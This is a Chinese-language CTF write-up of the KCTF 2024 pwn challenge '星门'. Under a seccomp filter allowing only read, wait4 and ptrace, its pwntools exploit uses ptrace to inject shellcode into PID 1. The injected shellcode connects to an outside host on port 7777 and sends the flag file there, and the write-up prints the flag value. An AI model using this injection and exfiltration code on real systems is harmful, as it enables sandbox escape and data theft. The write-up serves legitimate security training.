---
title: 2024 KCTF 大赛 - 第八题《星门》设计思路及解析
contest: KCTF大赛
year: 2024
difficulty: hard
vuln_type: [pwn_unknown, shellcode, syscall]
tags: [seccomp只允许ptrace/read/wait4, ptrace注入, shellcode注入1号进程, PTRACE_POKETEXT, PTRACE_SETREGS, PTRACE_DETACH, PTRACE_KILL sleep, mmap rwx 0x1000, libc可执行段]
attack_chain: 加载 seccomp → mmap 0x1000 rwx → 读 shellcode → 跳到 shellcode → ptrace ATTACH PID=1 (/bin/sh) → wait4 → PTRACE_GETREGS 取用户态寄存器 → 通过 r10/regs 算 libc 基址 → PTRACE_POKETEXT 写 sleep infinity 进程内的 libc 可执行段 → PTRACE_SETREGS 改 rip 跳到 shellcode → PTRACE_DETACH → 杀 PID=15 (sleep) 触发执行 → shellcode connect 外网 + open /home/sectest/flag + sendfile
key_payload: seccomp_init(SCMP_ACT_KILL) + rule_add(ALLOW, ptrace/read/wait4) ; PTRACE_POKETEXT +0x77ae ; PTRACE_POKEDATA +0x29db4 ; flag{4297f44b13955235245b2497399d7a93}
one_liner: seccomp 三 syscall + ptrace 注入 1 号进程 + 改 sleep 的 rip 跑 shellcode。
lesson: 沙盒类 pwn 关键在 ptrace 注入到同 docker 内其他进程（通常有 sleep infinity）借其身份开 IO。
quality: high
---
# 2024 KCTF 大赛 - 第八题《星门》设计思路及解析

**出题战队 xs · 一血 hzqmwne 用时 3h11m28s · 6 队提交**

## 题目分析

```c
int main() {
    init();
    buf = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    setup_seccomp();
    read(0, buf, 0x1000);
    ((void (*)(void))buf)();  // 跳到用户 shellcode
    munmap(buf, 0x1000);
}
```

`seccomp-tools dump ./power`：
```
A == ARCH_X86_64
A == read        → ALLOW
A == wait4       → ALLOW
A == ptrace      → ALLOW
default          → KILL
```

只允许 `read / wait4 / ptrace` 三个 syscall。

## 思路：ptrace 注入

docker 中有进程：
```
PID 1  /bin/sh /start.sh
PID 15 sleep infinity       ← 关键
PID 16 /usr/sbin/xinetd
```

`sleep infinity` 进程卡在 `pause()`，rip 固定，最适合注入。

## exp 流程

```python
sc  = 'mov r15, rcx; add r15, 0x77ae;'                # r15 = ptrace libc
sc += shellcraft.ptrace(PTRACE_ATTACH, 1, 0, 0)        # ATTACH /bin/sh
sc += shellcraft.wait4(1, 0, 0)
sc += shellcraft.ptrace(PTRACE_GETREGS, 1, 0)          # 读 regs
# 从 regs 算 libc 基址 & 可执行段起始
sc += 'mov r11, qword ptr [r10+128]; sub r11, 0xea5f7; add r11, 0x29db4;'  # syscall_libc
sc += 'mov r12, qword ptr [r10+128]; sub r12, 0x1000; and r12, ~0xfff;'   # 可执行段

# POKEDATA 写 shellcode 到 r12
pid_sc = shellcraft.connect('xxx', 7777)
pid_sc += shellcraft.open('/home/sectest/flag', 0, 0)
pid_sc += shellcraft.sendfile(3, 4, 0, 0x100)
pid_sc += shellcraft.exit(0)
pid_sc = reverse_groups(asm(pid_sc)).hex()
for i in range(0, len(pid_sc), 16):
    data = int(pid_sc[i:i+16], 16)
    sc += f'''
    mov rax, 0x65; mov edi, 0x4; mov rsi, {pid};
    mov rdx, r13; mov rcx, {data}; call r15; add r13, 8;'''

# POKEDATA 写 int3 触发（不同方案，1 号进程的 rcx 指针）
sc += 'mov rax, 0x65; mov edi, 0x1; mov rsi, 1; mov rdx, r12; mov rcx, 0; call r15;'

# PTRACE_SETREGS 改 rip = r12 + 2（对齐 16 字节后再 +2 跳真实 shellcode）
sc += 'xor ecx, ecx; mov r10, r14; mov rcx, r10; add r12, 2; mov [r10+128], r12;'
sc += shellcraft.ptrace(PTRACE_SETREGS, 1, 0)
sc += shellcraft.ptrace(PTRACE_DETACH, 1, 0, 0)

p.send(asm(sc))
```

**关键点**：
1. **libc 可执行段**：用 r10 拿 user_regs 后 `r10+128` 是 RIP 减一值，再 `-0x1000 & 0xFFF...` 对齐到可执行段起始
2. **POKEDATA 要用 libc ptrace 函数**（不能直接 syscall）→ 算 `ptrace` 函数地址 +0x77ae
3. **+2 对齐**：写完 shellcode 跳过去要 +2 让 RIP 落到真实指令起始（避免 start 函数序言）
4. **唤醒机制**：杀 PID=15 让 1 号进程被 kernel 调度到执行注入的 shellcode

## flag 提取

```python
pid_sc = shellcraft.connect('vps_ip', 7777)   # 反向外连
pid_sc += shellcraft.open('/home/sectest/flag', 0, 0)
pid_sc += shellcraft.sendfile(3, 4, 0, 0x100)  # fd=3 socket, fd=4 flag
pid_sc += shellcraft.exit(0)
```

flag = `flag{4297f44b13955235245b2497399d7a93}`
